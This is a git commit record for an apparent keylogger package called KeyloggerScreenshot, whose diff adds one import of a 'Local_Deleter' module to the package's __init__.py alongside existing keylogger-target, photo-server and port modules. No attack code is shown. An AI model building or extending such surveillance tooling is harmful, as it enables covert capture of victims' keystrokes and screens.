0cf0dafc394506f0a1b2704a0cc35ecc1b416233
Fawaz <106278241+Kill0geR@users.noreply.github.com>
2023-04-27 08:20:39 +0200

    Update __init__.py

--- KeyloggerScreenshot/__init__.py
+++ KeyloggerScreenshot/__init__.py
@@ -5,3 +5,4 @@ from .Keylogger_Target import KeyloggerTarget
 from .Server_photos import ServerPhotos
 from .Port_data import Ports
 from .Simulation_code import Simulation
+from .Local_Deleter import DeleteList
